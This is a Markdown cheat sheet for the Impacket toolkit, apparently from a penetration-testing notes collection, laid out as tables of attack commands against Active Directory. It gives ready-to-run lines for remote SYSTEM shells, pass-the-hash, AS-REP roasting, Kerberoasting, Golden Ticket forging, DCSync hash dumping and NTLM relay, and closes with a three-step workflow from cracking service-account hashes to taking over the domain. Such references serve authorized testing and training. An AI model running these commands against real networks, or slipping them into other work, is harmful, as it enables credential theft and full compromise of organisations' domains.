# 🐍 Impacket Cheat Sheet

**Impacket** is a collection of Python scripts for working with network protocols — the backbone of most Active Directory attacks (remote execution, Kerberos abuse, hash dumping). Scripts are sometimes prefixed `impacket-` (e.g. `impacket-secretsdump`).

> 💡 **Credential format** is consistent across tools: `domain/user:password@target`. For Pass-the-Hash use `-hashes LM:NT` and drop the password.

---

## Remote command execution (get a shell)

| Script | Example | Description |
| --- | --- | --- |
| `psexec.py` | `psexec.py domain/admin:pass@10.10.10.1` | SYSTEM shell via a service (noisy, classic) |
| `wmiexec.py` | `wmiexec.py domain/admin:pass@10.10.10.1` | Semi-interactive shell over WMI (stealthier) |
| `smbexec.py` | `smbexec.py domain/admin:pass@10.10.10.1` | Shell via SMB |
| `atexec.py` | `atexec.py domain/admin:pass@10.10.10.1 whoami` | Run a command via Task Scheduler |
| **Pass-the-Hash** | `psexec.py -hashes :31d6c... admin@10.10.10.1` | Auth with an NT hash, no password |

## Kerberos attacks

| Script | Example | Description |
| --- | --- | --- |
| `GetNPUsers.py` | `GetNPUsers.py domain/ -usersfile users.txt -no-pass` | **AS-REP roasting** — grab hashes for users without pre-auth |
| `GetUserSPNs.py` | `GetUserSPNs.py domain/user:pass -request` | **Kerberoasting** — request service-account ticket hashes |
| `ticketer.py` | `ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain domain user` | Forge a **Golden Ticket** |
| `getTGT.py` | `getTGT.py domain/user:pass` | Request a TGT (save as ccache) |
| `getST.py` | `getST.py -spn cifs/host domain/user:pass` | Request a service ticket |

## Credential & hash dumping

| Script | Example | Description |
| --- | --- | --- |
| `secretsdump.py` | `secretsdump.py domain/admin:pass@10.10.10.1` | Dump SAM + LSA + cached creds |
| `secretsdump.py -just-dc` | `secretsdump.py -just-dc domain/admin:pass@dc` | **DCSync** — pull all domain hashes from a DC |
| `secretsdump.py -ntds` | `secretsdump.py -ntds ntds.dit -system system LOCAL` | Parse an offline NTDS.dit |

## Handy extras

| Script | Description |
| --- | --- |
| `smbserver.py share .` | Spin up a quick SMB share (file transfer, capture hashes) |
| `ntlmrelayx.py -t smb://10.10.10.1` | NTLM relay attack |
| `mssqlclient.py domain/user:pass@10.10.10.1` | Interactive MSSQL client |
| `lookupsid.py domain/user:pass@10.10.10.1` | Enumerate users via RID brute |

---

## 🧭 Typical workflow

```bash
# 1. Kerberoast service accounts, then crack offline
GetUserSPNs.py CORP/bob:'Password1' -dc-ip 10.10.10.1 -request -outputfile spns.txt
hashcat -m 13100 spns.txt rockyou.txt

# 2. With admin creds, DCSync every hash from the domain controller
secretsdump.py CORP/admin:'Password1'@10.10.10.1 -just-dc

# 3. Pass-the-Hash into a SYSTEM shell
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.5
```

> 🔗 Hash modes for [hashcat](../hashcat): AS-REP = `18200`, Kerberoast = `13100`, NTLM = `1000`. Enumerate first with [netexec](../netexec); shell in with [evil-winrm](../evil-winrm).
